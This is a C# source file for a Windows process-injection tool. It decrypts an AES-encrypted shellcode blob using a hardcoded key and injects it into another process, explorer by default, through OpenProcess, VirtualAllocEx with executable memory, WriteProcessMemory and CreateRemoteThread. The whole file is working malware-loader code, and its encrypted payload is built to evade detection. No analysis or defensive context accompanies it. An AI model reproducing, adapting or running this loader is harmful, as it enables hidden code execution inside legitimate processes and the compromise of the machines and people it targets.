using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;



namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


        static byte[] Decrypt(byte[] encryptedArray)
        {
            using (Aes aes = Aes.Create())
            {
                byte[] key = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10 };
                aes.Key = key;
                aes.IV = new byte[aes.BlockSize / 8];

                ICryptoTransform decryptor = aes.CreateDecryptor();
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(encryptedArray, 0, encryptedArray.Length);
                    }

                    byte[] decryptedArray = memoryStream.ToArray();

                    Console.WriteLine();
                    Console.WriteLine("The Decrypted Bytearray:");
                    BytePrinter(decryptedArray);

                    return decryptedArray;
                }
            }
        }

        static void BytePrinter(byte[] inputArray)
        {
            foreach (byte b in inputArray)
            {
                if (b == inputArray.Last())
                {
                    Console.Write("0x{0:X2}", b);

                }

                else
                {
                    Console.Write("0x{0:X2}, ", b);

                }

            }
            Console.WriteLine();

        }


        static void Main(string[] args)
        {

            string procarg = "explorer";

            if (args.Length == 1)
            {
                procarg = args[0];
                Console.WriteLine("Process name provided {0}", procarg);

            }

            else
            {
                Console.WriteLine("Without any input default process to be inejcted is explorer");

            }

            Process[] processes = Process.GetProcessesByName(procarg);

            if (processes.Length > 0)
            {
                int processId = processes[0].Id;
                Console.WriteLine("Process ID of {0} is {1}", procarg, processId);
            }
            else
            {
                Console.WriteLine("No processes found with name {0}", procarg);
                Environment.Exit(0);
            }


            IntPtr hProcess = OpenProcess(0x001F0FFF, false, processes[0].Id);

            if (hProcess != IntPtr.Zero)
            {
                Console.WriteLine("OpenProcess succeeded, handle = " + hProcess.ToString());
            }
            else
            {
                Console.WriteLine("OpenProcess failed, error = " + Marshal.GetLastWin32Error().ToString());
                Environment.Exit(0);
            }

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);


            if (addr != IntPtr.Zero)
            {
                Console.WriteLine("VirtualAlloc succeeded, pointer = " + addr.ToString());

            }
            else
            {
                Console.WriteLine("VirtualAlloc failed, error = " + Marshal.GetLastWin32Error().ToString());
                Environment.Exit(0);
            }


            byte[] buf = new byte[]{
0xC9, 0x38, 0xF9, 0x3A, 0x22, 0x17, 0x2D, 0x4C, 0xED, 0xE4, 0x76, 0x87, 0x9A, 0x4D,
0x9E, 0x37, 0x19, 0x7F, 0x13, 0x99, 0x78, 0xD6, 0xE7, 0xD5, 0x73, 0xD7, 0x73, 0x8D, 0x08,
0x5E, 0xCE, 0x7F, 0x73, 0x39, 0x36, 0x5E, 0x83, 0xA8, 0x3F, 0x00, 0x5C, 0xB6, 0x07, 0x25,
0xAC, 0xD5, 0xF6, 0xFD, 0x66, 0xD3, 0x3D, 0xC9, 0xDF, 0xE0, 0x9C, 0x2B, 0x22, 0x66, 0x12,
0x25, 0x30, 0xCA, 0x70, 0xCF, 0x86, 0xF2, 0x42, 0x83, 0xDE, 0x8C, 0x4B, 0x39, 0x8D, 0x4F,
0xEE, 0x2A, 0x46, 0x32, 0x58, 0xE5, 0x8E, 0xD9, 0xC9, 0xBD, 0xC4, 0x40, 0xE4, 0x95, 0xBC,
0x8A, 0x97, 0x46, 0xC6, 0x8B, 0x19, 0xD8, 0xF4, 0xE1, 0x8A, 0x0A, 0xAF, 0x5D, 0x0A, 0xAC,
0x2C, 0x1E, 0xB6, 0x2C, 0xBA, 0xAC, 0x3D, 0x8F, 0xBA, 0x3C, 0xF0, 0xF3, 0x2B, 0x68, 0x68,
0x2D, 0xE5, 0xCB, 0x9A, 0x02, 0x2F, 0x8E, 0x83, 0xE9, 0xFB, 0x8A, 0x43, 0x66, 0x32, 0x82,
0xB2, 0x5E, 0xB5, 0xED, 0x22, 0x19, 0xEF, 0xE0, 0xD8, 0xC7, 0x9E, 0x36, 0x68, 0xAC, 0x61,
0xE2, 0x47, 0xDC, 0xE0, 0xF8, 0x5E, 0x74, 0xD4, 0x4E, 0xFB, 0x01, 0xAD, 0xA4, 0x88, 0x3E,
0x41, 0x64, 0xE0, 0x71, 0xD8, 0xB7, 0x39, 0xC4, 0xED, 0x9C, 0xE8, 0xCD, 0x10, 0xB2, 0x9C,
0xD6, 0x86, 0x78, 0x56, 0xB2, 0x43, 0x9E, 0x66, 0x6B, 0x55, 0xB9, 0x9D, 0xF4, 0xE9, 0x13,
0x01, 0x09, 0x5B, 0x3B, 0x45, 0x10, 0x15, 0xC6, 0x92, 0x33, 0xE5, 0xEE, 0xC7, 0xF9, 0x54,
0xED, 0x41, 0xC7, 0x6E, 0x5D, 0x17, 0xF5, 0xC8, 0xC5, 0x84, 0x6B, 0x93, 0x2F, 0x3B, 0x50,
0x93, 0x43, 0x88, 0xFC, 0x12, 0x4E, 0xCB, 0x86, 0xA3, 0xAA, 0x6F, 0x0B, 0x75, 0x1A, 0x8C,
0xDF, 0x35, 0x83, 0xEF, 0x8B, 0x28, 0x70, 0xA8, 0xE3, 0xFA, 0xA0, 0x9A, 0xC0, 0xA9, 0x6C,
0x3B, 0xA8, 0xBE, 0xB4, 0x4C, 0x9B, 0xE8, 0x4F, 0x98, 0x25, 0x3E, 0xF8, 0xCB, 0xC0, 0x25,
0x5D, 0x28, 0x8D, 0xD0, 0xB5, 0xAE, 0x4C, 0x58, 0xB7, 0x89, 0xBC, 0x89, 0x31, 0x0E, 0x59,
0x72, 0x74, 0xAE, 0xC9, 0x51, 0x00, 0xDB, 0xAB, 0x1C, 0xC9, 0xA1, 0x5B, 0x8A, 0x11, 0xC9,
0xA2, 0x8F, 0x86, 0x19, 0xFE, 0xEC, 0xF0, 0xE2, 0x29, 0xD9, 0xB0, 0x2C, 0xA8, 0x6F, 0xF6,
0x20, 0xEA, 0x8D, 0xB9, 0x27, 0xA3, 0xAC, 0x67, 0x57, 0x82, 0xD5, 0x11, 0xBC, 0x5D, 0xF5,
0xD8, 0x7E, 0xB2, 0x3B, 0x4D, 0xD4, 0xF9, 0x56, 0x35, 0x43, 0xE1, 0x6B, 0x5A, 0xFE, 0x59,
0x2B, 0x90, 0x29, 0xE8, 0x3C, 0x6F, 0xE7, 0x75, 0x3D, 0xD5, 0xF0, 0x9E, 0xB2, 0x48, 0xD4,
0xDD, 0x1C, 0x17, 0x59, 0x47, 0xD2, 0x5A, 0x66, 0x0B, 0x4C, 0xC1, 0xA7, 0x8B, 0xC1, 0xDD,
0x5A, 0xF6, 0xCA, 0xA2, 0xF5, 0x5C, 0x0B, 0xFF, 0x85, 0x4D, 0x41, 0x80, 0xB8, 0x9B, 0x06,
0x41, 0xB7, 0xF1, 0xB2, 0xCE, 0x23, 0xCF, 0xC3, 0x2B, 0xA1, 0x11, 0x07, 0xF7, 0x09, 0xEE,
0x81, 0xE5, 0x0F, 0x6F, 0x3A, 0x26, 0x74, 0xBB, 0x17, 0x86, 0x12, 0x9D, 0x07, 0x17, 0x61,
0x31, 0x5B, 0x66, 0xDE, 0x4C, 0x83, 0xD9, 0xA4, 0xCE, 0xC5, 0x6B, 0xD8, 0x28, 0x7E, 0x97,
0xBA, 0xBD, 0xFF, 0xD5, 0x6B, 0xC5, 0xB2, 0x38, 0x0A, 0xED, 0x02, 0x2C, 0xFC, 0x5A, 0x22,
0x20, 0x70, 0x03, 0x49, 0x24, 0x0E, 0x5D, 0x1A, 0xB7, 0x82, 0xE6, 0x4D, 0xCC, 0x04, 0xB6,
0xBD, 0x48, 0x4E, 0x51, 0xDD, 0xF6, 0x39, 0xF3, 0xAE, 0x30, 0x9D, 0xD6, 0x87, 0x43, 0x04,
0x57, 0xB6, 0x59, 0x40, 0x3B, 0x4A, 0xA1, 0x18, 0xA8, 0xD3, 0x0E, 0xA9, 0x92, 0x84, 0xDC,
0xAD, 0x7A, 0xA7, 0x0C, 0x61, 0x90, 0x2B, 0x09, 0x76, 0x41, 0x9A, 0xFD, 0x4D, 0xF4, 0xD4,
0x0E, 0xC6, 0x62};

            byte[] debuf = Decrypt(buf);

            IntPtr outSize;
            bool value = WriteProcessMemory(hProcess, addr, debuf, debuf.Length, out outSize);

            if (value)
            {
                Console.WriteLine("WriteProcessMemory succeeded");
            }
            else
            {
                Console.WriteLine("WriteProcessMemory failed, error = " + Marshal.GetLastWin32Error().ToString());
                Environment.Exit(0);
            }

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("CreateRemoteThread failed, error = " + Marshal.GetLastWin32Error().ToString());
            }
            else
            {
                Console.WriteLine("CreateRemoteThread succeeded, thread ID = " + hThread.ToString());
                Environment.Exit(0);

            }


        }
    }
}
